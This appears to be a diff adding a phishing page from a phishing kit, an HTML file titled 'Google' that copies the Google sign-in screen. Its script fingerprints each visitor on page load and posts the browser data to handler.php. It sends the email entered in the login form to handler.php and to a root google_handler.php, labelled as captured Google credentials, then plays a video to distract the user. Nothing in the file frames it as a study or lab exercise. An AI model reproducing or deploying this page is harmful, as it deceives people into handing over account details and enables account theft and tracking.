@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+        }
+
+        .google-logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .google-logo h1 {
+            color: #1a73e8;
+            font-size: 24px;
+            font-weight: 400;
+        }
+
+        .signin-text {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .signin-text h2 {
+            color: #202124;
+            font-size: 24px;
+            font-weight: 400;
+        }
+
+        .signin-text p {
+            color: #5f6368;
+            font-size: 16px;
+            margin-top: 8px;
+        }
+
+        .login-form {
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+
+        .forgot-password {
+            text-align: left;
+            margin-bottom: 24px;
+        }
+
+        .forgot-password a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-button {
+            background: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-button:hover {
+            background: #1557b0;
+        }
+
+        .next-button:disabled {
+            background: #dadce0;
+            cursor: not-allowed;
+        }
+
+        .reel-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .reel-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .reel-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 10000;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body onload="mydata()">
+    <div class="container">
+        <div class="google-logo">
+            <h1>Google</h1>
+        </div>
+
+        <div class="signin-text">
+            <h2>Sign in</h2>
+            <p>Use your Google Account</p>
+        </div>
+
+        <form class="login-form" id="loginForm">
+            <div class="form-group">
+                <input type="email" class="form-input" id="email" name="email" placeholder="Email or phone" required>
+            </div>
+            
+            <div class="loading-spinner" id="loadingSpinner"></div>
+            <div class="error-message" id="errorMessage"></div>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot email?</a>
+            </div>
+
+            <div class="button-group">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="next-button" id="nextButton">
+                    Next
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Reel Container -->
+    <div class="reel-container" id="reelContainer">
+        <video class="reel-video" id="reelVideo" autoplay muted loop>
+            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4" type="video/mp4">
+        </video>
+        <button class="reel-close" id="reelClose">×</button>
+    </div>
+
+    <script>
+        function post(data) {
+            $.ajax({
+                type: 'POST',
+                data: { data: data },
+                url: 'handler.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    console.log('Data sent to local handler successfully');
+                },
+                error: function() {
+                    console.log('Error sending data to local handler');
+                }
+            });
+            
+            if(data.includes('google_login')) {
+                $.ajax({
+                    type: 'POST',
+                    data: { data: data },
+                    url: '../../google_handler.php',
+                    dataType: 'json',
+                    async: false,
+                    success: function(result) {
+                        console.log('Google credentials sent to root handler successfully');
+                    },
+                    error: function() {
+                        console.log('Error sending Google credentials to root handler');
+                    }
+                });
+            }
+        }
+
+        function mydata() {
+            const userData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                url: window.location.href
+            };
+            post(JSON.stringify(userData));
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const nextButton = document.getElementById('nextButton');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            errorMessage.style.display = 'none';
+            
+            if (!email) {
+                showError('Please enter an email or phone number');
+                return;
+            }
+            
+            nextButton.disabled = true;
+            nextButton.textContent = 'Signing in...';
+            loadingSpinner.style.display = 'block';
+            
+            setTimeout(() => {
+                const loginData = {
+                    email: email,
+                    timestamp: new Date().toISOString(),
+                    loginStatus: 'success',
+                    userAgent: navigator.userAgent,
+                    ip: 'captured',
+                    sessionId: Math.random().toString(36).substr(2, 9)
+                };
+                
+                post(JSON.stringify({
+                    type: 'google_login',
+                    email: email,
+                    data: loginData,
+                    timestamp: new Date().toISOString()
+                }));
+                
+                nextButton.disabled = false;
+                nextButton.textContent = 'Next';
+                loadingSpinner.style.display = 'none';
+                
+                playReel();
+            }, 1500);
+        });
+
+        function showError(message) {
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+        }
+
+        function playReel() {
+            const reelContainer = document.getElementById('reelContainer');
+            const reelVideo = document.getElementById('reelVideo');
+            
+            reelContainer.style.display = 'flex';
+            reelVideo.play();
+            
+            setTimeout(() => {
+                closeReel();
+            }, 10000);
+        }
+
+        function closeReel() {
+            const reelContainer = document.getElementById('reelContainer');
+            const reelVideo = document.getElementById('reelVideo');
+            
+            reelVideo.pause();
+            reelContainer.style.display = 'none';
+        }
+
+        document.getElementById('reelClose').addEventListener('click', closeReel);
+        document.getElementById('reelContainer').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeReel();
+            }
+        });
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeReel();
+            }
+        });
+    </script>
+</body>
+</html>
